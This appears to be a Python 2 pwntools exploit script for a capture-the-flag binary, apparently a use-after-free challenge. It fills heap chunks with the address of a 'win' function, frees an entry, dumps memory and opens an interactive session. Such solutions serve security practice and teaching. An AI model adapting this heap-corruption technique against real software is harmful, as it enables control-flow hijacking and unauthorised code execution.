#python2

import string
import json

from pwn import *

NAME = "./usemedontabuseme"
context.binary = NAME

def io_beg():
	return process(NAME)

def io_rdy(io):
	io.recvuntil("| [Q] Exit       |")
	io.recvuntil("Choice:")
	print("Ready")

def header(s, len=20):
	return ("="*len +s+"="*len)
	
def io_a(io, id, s):
	io.sendline("a")
	
	io.recvuntil("Preparing to clone body...")
	io.recvuntil("Clone ID:")
	io.sendline(str(id))
	
	io.recvuntil("Enter Name (max length 8):")
	io.sendline(s)
	
	io_rdy(io)

def io_b(io, id):
	# RET vals
	#	-1	"Clone doesnt exist!"
	#	00	Bad ID
	#	01	Success

	io.sendline("b")
	
	# might be several lines, so let's say it's at least one line
	io.recvline()
	
	# ok back on track
	io.recvuntil("Clone ID:")
	io.sendline(str(id))

	# now lets see what the program says
	buf1 = io.recvline()
	buf2 = buf1.split(" ")
	buf3 = buf2[-1]
	
	if(unicode(buf3).isnumeric()):
		buf4 = int(buf3)
		if(id == buf4):
			r = 1
		else:
			r = 0
	else:
		r = -1
		
	io_rdy(io)
	return r
		

def io_c(io, id, s):
	# RET vals
	#	"Clone doesnt exist!"
	#	"blablabla"	program output
	
	io.sendline("c")
	
	# might be several lines, so let's say it's at least one line
	io.recvline()
	
	# ok back on track
	io.recvuntil("Clone ID:")
	io.sendline(str(id))

	# now lets see what the program says
	buf1 = io.recv(timeout=1)
	
	if(buf1.find("doesnt exist") != -1):
		r = buf1
	elif(buf1.find("Enter Name (max length 8):") != -1):
		io.sendline(s)
		r = io.recvline()
		
	io_rdy(io)
	return r

def io_d(io, id):
	io.sendline("d")
	
	# might be several lines, so let's say it's at least one line
	io.recvline()
	
	# ok back on track
	io.recvuntil("Clone ID:")
	
	sid = str(id)
	io.sendline(sid)

	buf = io.recvuntil("------------------")
	buf = buf.replace("------------------", "")
	buf2 = header(sid+" BEG") + "\n" + buf + header(sid+" FIN") + "\n"
	return buf2

def io_q(io):
	io.sendline("q")
	io.recvuntil("Goodbye!")
	return 1

def io_pill(io, min, max):
	buf = ""
	for i in range(max-min+1):
		k = i+min
		buf += io_d(io, k)
		
	return buf

def io_fill(io, min, max):
	# win	08048B7C	
	win = str(p32(0x08048B7C))
	
	c = cyclic(1024, alphabet="0123456789")
	
	for i in range(max-min+1):
		k = i+min
		buf = win*1000 #c[k*8 : (k+1)*8]
		io_a(io, i, buf)

io = io_beg()
io_fill(io, 0, 8)
print(io_pill(io, 0, 9))
print(header("Phrase 2"))
io_b(io, 5)
print(io_pill(io, 0, 9))


io.interactive()
